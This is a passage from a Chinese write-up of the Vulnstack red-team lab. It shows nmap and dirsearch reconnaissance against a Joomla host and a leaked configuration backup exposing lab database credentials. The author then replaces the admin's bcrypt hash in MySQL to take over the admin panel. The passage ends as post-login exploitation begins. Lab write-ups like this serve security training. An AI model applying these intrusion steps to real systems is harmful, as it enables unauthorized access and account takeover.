{"pageProps":{"postData":{"id":"Vulnstack红队评估实战靶场(三)","contentHtml":"<h1>ATT&#x26;CK红队评估实战靶场(三)</h1>\n<blockquote>\n<p><a href=\"http://vulnstack.qiyuanxuetang.net/vuln/detail/5/\">http://vulnstack.qiyuanxuetang.net/vuln/detail/5/</a></p>\n</blockquote>\n<h2>靶场搭建</h2>\n<ol>\n<li>修改仅主机网卡 A IP为<code>192.168.93.0</code> ，然后在添加一张仅主机网卡B，ip随意，我这里为<code>192.168.213.0</code> 网段</li>\n<li>web主机网卡内网设置网卡 A，出口网卡为网卡B</li>\n<li>其余主机网卡都是仅主机网卡 A</li>\n<li>内网测试，访问web主机服务是否正常</li>\n</ol>\n<p><strong>目标：域控中存在一份重要文件。</strong></p>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>扫描网段内存活主机</p>\n<pre><code class=\"hljs language-python\">nmap -sP <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.0</span>/<span class=\"hljs-number\">24</span>                                      \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">37</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.1</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.000072</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:08 (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.2</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00011</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00025</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">46</span>:C9 (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.254</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00012</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:F1:A9:3F (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.129</span>\n</code></pre>\n<p>根据靶机是我添加的最后一台靶机，所以靶机IP是<code>156</code> ，<code>kali</code> 的IP是<code>150</code></p>\n</li>\n<li>\n<p>扫描靶机端口</p>\n<pre><code class=\"hljs language-python\">nmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">38</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00057</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http\n<span class=\"hljs-number\">3306</span>/tcp <span class=\"hljs-built_in\">open</span>  mysql\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">46</span>:C9 (VMware)\n</code></pre>\n<p><code>SSH</code>，<code>WEB</code>，<code>MYSQL</code>端口</p>\n</li>\n<li>\n<p>扫描主机服务版本以及系统版本</p>\n<pre><code class=\"hljs language-python\">nmap -sV -sT -O -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">3306</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>                  \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">39</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00037</span>s latency).\n\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh     OpenSSH <span class=\"hljs-number\">5.3</span> (protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http    nginx <span class=\"hljs-number\">1.9</span><span class=\"hljs-number\">.4</span>\n<span class=\"hljs-number\">3306</span>/tcp <span class=\"hljs-built_in\">open</span>  mysql   MySQL <span class=\"hljs-number\">5.7</span><span class=\"hljs-number\">.27</span>-0ubuntu0<span class=\"hljs-number\">.16</span><span class=\"hljs-number\">.04</span><span class=\"hljs-number\">.1</span>\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">46</span>:C9 (VMware)\nWarning: OSScan results may be unreliable because we could <span class=\"hljs-keyword\">not</span> find at least <span class=\"hljs-number\">1</span> <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux <span class=\"hljs-number\">2.6</span>.X|<span class=\"hljs-number\">3.</span>X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">2.6</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span>\nOS details: Linux <span class=\"hljs-number\">2.6</span><span class=\"hljs-number\">.32</span> - <span class=\"hljs-number\">3.10</span>\n</code></pre>\n</li>\n<li>\n<p>扫描主机服务漏洞，使用<code>nmap</code>扫描</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">3306</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>                                                                                                                                                               \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">39</span> CST                                                                                                                                                \nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>                                                                                                                                                                              \nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00049</span>s latency).                                                                                                                                                                                    \n                                                                                                                                                                                                                  \nPORT     STATE SERVICE                                                                                                                                                                                            \n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh                                                                                                                                                                                                \n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http                                                                                                                                                                                               \n               \n| http-dombased-xss:                                \n| Spidering limited to: maxdepth=<span class=\"hljs-number\">3</span>; maxpagecount=<span class=\"hljs-number\">20</span>; withinhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>                          \n|   Found the following indications of potential DOM based XSS:                                          \n|                                                   \n|     Source: window.<span class=\"hljs-built_in\">open</span>(this.href,<span class=\"hljs-string\">'win2'</span>,<span class=\"hljs-string\">'status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'</span>)\n|_    Pages: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>:<span class=\"hljs-number\">80</span>/, http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>:<span class=\"hljs-number\">80</span>/, http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>:<span class=\"hljs-number\">80</span>/, http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>:<span class=\"hljs-number\">80</span>/, http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>:<span class=\"hljs-number\">80</span>/index.php/<span class=\"hljs-number\">3</span>-welcome-to-your-blog, http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>:<span class=\"hljs-number\">80</span>                                        \n| http-enum:                                        \n|   /administrator/: Possible admin folder          \n|   /administrator/index.php: Possible admin folder                                                      \n|   /robots.txt: Robots file                        \n|   /administrator/manifests/files/joomla.xml: Joomla version <span class=\"hljs-number\">3.9</span><span class=\"hljs-number\">.12</span>                                     \n|   /language/en-GB/en-GB.xml: Joomla version <span class=\"hljs-number\">3.9</span><span class=\"hljs-number\">.12</span>                                                     \n|   /htaccess.txt: Joomla!                          \n|   /README.txt: Interesting, a readme.             \n|   /<span class=\"hljs-built_in\">bin</span>/: Potentially interesting folder           \n|   /cache/: Potentially interesting folder         \n|   /images/: Potentially interesting folder        \n|   /includes/: Potentially interesting folder      \n|   /libraries/: Potentially interesting folder     \n|   /modules/: Potentially interesting folder       \n|   /templates/: Potentially interesting folder     \n|_  /tmp/: Potentially interesting folder           \n<span class=\"hljs-number\">3306</span>/tcp <span class=\"hljs-built_in\">open</span>  mysql                                \n|_mysql-vuln-cve2012-<span class=\"hljs-number\">2122</span>: ERROR: Script execution failed (use -d to debug)                              \nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">46</span>:C9 (VMware)             \n\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">75.86</span> seconds \n</code></pre>\n<p><code>80</code>端口枚举出很多路径，以及CMS估计是<code>Joomla</code> ，<code>3306</code>端口发现<code>cve2012-2122</code> ，但是脚本注入失败</p>\n<p>优先级：<code>80</code>><code>3306</code>><code>22</code></p>\n</li>\n</ol>\n<h2>WEB渗透</h2>\n<ol>\n<li>\n<p>访问主页，网站指纹识别</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image39.png\" alt=\"image.png\"></p>\n<p>当前网站CMS是<code>Joomla 3.9.12</code>，<code>Nginx</code>，并且是反向代理的</p>\n</li>\n<li>\n<p>扫描一下网站目录</p>\n<pre><code class=\"hljs language-python\">dirsearch -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span> -x <span class=\"hljs-number\">403</span>,<span class=\"hljs-number\">404</span> -e php,<span class=\"hljs-built_in\">zip</span>,html,txt                                                                                                             \n//                                                                                                             \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">25</span>] Starting:                                                                                         \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">30</span>] <span class=\"hljs-number\">200</span> -   24KB - /<span class=\"hljs-number\">1.</span>php                                                                                                                                                      \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">301</span> -  326B  - /administrator  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/administrator/                          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">200</span> -    2KB - /administrator/                                                                    \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">200</span> -  527B  - /administrator/includes/                                                           \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">200</span> -   31B  - /administrator/cache/                                                              \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">200</span> -   31B  - /administrator/logs/                                                               \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">200</span> -    2KB - /administrator/index.php                                                           \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">301</span> -  331B  - /administrator/logs  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/administrator/logs/                \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">42</span>] <span class=\"hljs-number\">301</span> -  316B  - /<span class=\"hljs-built_in\">bin</span>  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/<span class=\"hljs-built_in\">bin</span>/                                              \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">42</span>] <span class=\"hljs-number\">200</span> -   31B  - /<span class=\"hljs-built_in\">bin</span>/                                                                              \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">43</span>] <span class=\"hljs-number\">301</span> -  318B  - /cache  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/cache/                                          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">43</span>] <span class=\"hljs-number\">200</span> -   31B  - /cache/                                                                            \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">200</span> -   31B  - /cli/                        \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">301</span> -  323B  - /components  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/components/\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">200</span> -   31B  - /components/                                       \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">45</span>] <span class=\"hljs-number\">200</span> -    0B  - /configuration.php           \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">45</span>] <span class=\"hljs-number\">200</span> -    2KB - /configuration.php~          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">52</span>] <span class=\"hljs-number\">200</span> -    1KB - /htaccess.txt                \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">301</span> -  319B  - /images  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/images/\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">200</span> -   31B  - /images/                                                                           \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">301</span> -  321B  - /includes  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/includes/                                                                                                                                         \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">200</span> -   31B  - /includes/                                     \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">200</span> -    4KB - /index.php           \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">200</span> -    3KB - /index.php/login/                                                                  \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">55</span>] <span class=\"hljs-number\">301</span> -  321B  - /language  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/language/                                    \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">55</span>] <span class=\"hljs-number\">200</span> -   31B  - /layouts/                                                                          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">56</span>] <span class=\"hljs-number\">301</span> -  322B  - /libraries  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/libraries/                                  \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">56</span>] <span class=\"hljs-number\">200</span> -   31B  - /libraries/                                                                        \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">56</span>] <span class=\"hljs-number\">200</span> -    7KB - /LICENSE.txt                                                                       \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">301</span> -  318B  - /media  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/media/                                          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">200</span> -   31B  - /media/                                                                            \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">59</span>] <span class=\"hljs-number\">301</span> -  320B  - /modules  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/modules/                                      \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">59</span>] <span class=\"hljs-number\">200</span> -   31B  - /modules/                                                                          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:05] <span class=\"hljs-number\">301</span> -  320B  - /plugins  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/plugins/                                      \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:05] <span class=\"hljs-number\">200</span> -   31B  - /plugins/                                                                          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:07] <span class=\"hljs-number\">200</span> -    2KB - /README.txt                                                                        \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:08] <span class=\"hljs-number\">200</span> -  392B  - /robots.txt                                                                        \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">14</span>] <span class=\"hljs-number\">301</span> -  322B  - /templates  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/templates/                                  \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">14</span>] <span class=\"hljs-number\">200</span> -   31B  - /templates/                                                                        \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">14</span>] <span class=\"hljs-number\">200</span> -   31B  - /templates/index.html                                                              \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">14</span>] <span class=\"hljs-number\">200</span> -    0B  - /templates/beez3/                                                                  \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">14</span>] <span class=\"hljs-number\">200</span> -    0B  - /templates/protostar/        \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">14</span>] <span class=\"hljs-number\">200</span> -    0B  - /templates/system/                                 \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">15</span>] <span class=\"hljs-number\">301</span> -  316B  - /tmp  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/tmp/              \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">15</span>] <span class=\"hljs-number\">200</span> -   31B  - /tmp/                        \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">19</span>] <span class=\"hljs-number\">200</span> -  628B  - /web.config.txt         \n</code></pre>\n<ul>\n<li>\n<p><code>1.php</code> 是<code>phpinfo</code></p>\n</li>\n<li>\n<p><code>/administrator</code> 登陆页面</p>\n</li>\n<li>\n<p><code>/configuration.php~</code> <code>Joomle</code>的配置文件</p>\n<p>嗯？还有回显，访问得到如下信息</p>\n<pre><code class=\"hljs language-python\">è¯·ç¨å€™è®¿é—®ã€‚<span class=\"hljs-string\">';\n\tpublic $display_offline_message = '</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">';\n\tpublic $offline_image = '</span><span class=\"hljs-string\">';\n\tpublic $sitename = '</span>test<span class=\"hljs-string\">';\n\tpublic $editor = '</span>tinymce<span class=\"hljs-string\">';\n\tpublic $captcha = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $list_limit = '</span><span class=\"hljs-number\">20</span><span class=\"hljs-string\">';\n\tpublic $access = '</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">';\n\tpublic $debug = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $debug_lang = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $debug_lang_const = '</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">';\n\tpublic $dbtype = '</span>mysqli<span class=\"hljs-string\">';\n\tpublic $host = '</span>localhost<span class=\"hljs-string\">';\n\tpublic $user = '</span>testuse<span class=\"hljs-string\">r';\n\tpublic $password = '</span>cvcvgjASD!@<span class=\"hljs-string\">';\n\tpublic $db = '</span>joomla<span class=\"hljs-string\">';\n\tpublic $dbprefix = '</span>am2zu_<span class=\"hljs-string\">';\n\tpublic $live_site = '</span><span class=\"hljs-string\">';\n\tpublic $secret = '</span>gXN9Wbpk7ef3A4Ys<span class=\"hljs-string\">';\n\tpublic $gzip = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $error_reporting = '</span>default<span class=\"hljs-string\">';\n\tpublic $helpurl = '</span>https://<span class=\"hljs-built_in\">help</span>.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&#x26;lang={langcode}<span class=\"hljs-string\">';\n\tpublic $ftp_host = '</span><span class=\"hljs-string\">';\n\tpublic $ftp_port = '</span><span class=\"hljs-string\">';\n\tpublic $ftp_user = '</span><span class=\"hljs-string\">';\n\tpublic $ftp_pass = '</span><span class=\"hljs-string\">';\n\tpublic $ftp_root = '</span><span class=\"hljs-string\">';\n\tpublic $ftp_enable = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $offset = '</span>UTC<span class=\"hljs-string\">';\n\tpublic $mailonline = '</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">';\n\tpublic $mailer = '</span>mail<span class=\"hljs-string\">';\n\tpublic $mailfrom = '</span>test@test.com<span class=\"hljs-string\">';\n\tpublic $fromname = '</span>test<span class=\"hljs-string\">';\n\tpublic $sendmail = '</span>/usr/sbin/sendmail<span class=\"hljs-string\">';\n\tpublic $smtpauth = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $smtpuser = '</span><span class=\"hljs-string\">';\n\tpublic $smtppass = '</span><span class=\"hljs-string\">';\n\tpublic $smtphost = '</span>localhost<span class=\"hljs-string\">';\n\tpublic $smtpsecure = '</span>none<span class=\"hljs-string\">';\n\tpublic $smtpport = '</span><span class=\"hljs-number\">25</span><span class=\"hljs-string\">';\n\tpublic $caching = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $cache_handler = '</span>file<span class=\"hljs-string\">';\n\tpublic $cachetime = '</span><span class=\"hljs-number\">15</span><span class=\"hljs-string\">';\n\tpublic $cache_platformprefix = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $MetaDesc = '</span><span class=\"hljs-string\">';\n\tpublic $MetaKeys = '</span><span class=\"hljs-string\">';\n\tpublic $MetaTitle = '</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">';\n\tpublic $MetaAuthor = '</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">';\n\tpublic $MetaVersion = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $robots = '</span><span class=\"hljs-string\">';\n\tpublic $sef = '</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">';\n\tpublic $sef_rewrite = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $sef_suffix = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $unicodeslugs = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $feed_limit = '</span><span class=\"hljs-number\">10</span><span class=\"hljs-string\">';\n\tpublic $feed_email = '</span>none<span class=\"hljs-string\">';\n\tpublic $log_path = '</span>/var/www/html/administrator/logs<span class=\"hljs-string\">';\n\tpublic $tmp_path = '</span>/var/www/html/tmp<span class=\"hljs-string\">';\n\tpublic $lifetime = '</span><span class=\"hljs-number\">15</span><span class=\"hljs-string\">';\n\tpublic $session_handler = '</span>database<span class=\"hljs-string\">';\n\tpublic $shared_session = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n}\n</span></code></pre>\n<p>得到了数据库账号<code>testuser</code>密码<code>cvcvgjASD!@</code> ，以及网站的根目录<code>/var/www/html/</code></p>\n</li>\n</ul>\n</li>\n<li>\n<p>尝试登录MYSQL，使用<code>Navicat</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image40.png\" alt=\"image.png\"></p>\n<p>登陆成功</p>\n</li>\n<li>\n<p>进入数据库后台后，查找敏感数据</p>\n<p>找到后台管理员的数据，在<code>am2zu_users</code> 表下</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-number\">891</span>\tSuper User\tadministrator\ttest@test.com\t$2y$<span class=\"hljs-number\">10</span>$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2\n</code></pre>\n<p>尝试使用<code>john</code>破解，但是无果，尝试修改<code>MYSQL</code>表文件</p>\n</li>\n<li>\n<p>将得到的后台管理员密码拿去识别得知是<strong>Bcrypt</strong>加密，是为了抗爆发明的，所以john破解无果（太慢了）</p>\n<p>我们将123456进行<strong>Bcrypt</strong>加密，得到</p>\n<blockquote>\n<p>加密网站：<a href=\"https://www.bejson.com/encrypt/bcrpyt_encode/\">https://www.bejson.com/encrypt/bcrpyt_encode/</a></p>\n</blockquote>\n<pre><code class=\"hljs language-python\">$2a$<span class=\"hljs-number\">10</span>$JYEZiw0pCY1NV9ZVsaJ39uAgaXUpzCvaFxvBDPwMBlQEkYmD7RXPi\n</code></pre>\n<p>然后将其替换到<code>administrator</code>上去，登陆后台，成功进入后台</p>\n</li>\n</ol>\n<h2>后台利用</h2>\n<ol>\n<li>\n<p>使用账号<code>administrator</code>密码<code>123456</code>登录后台</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image41.png\" 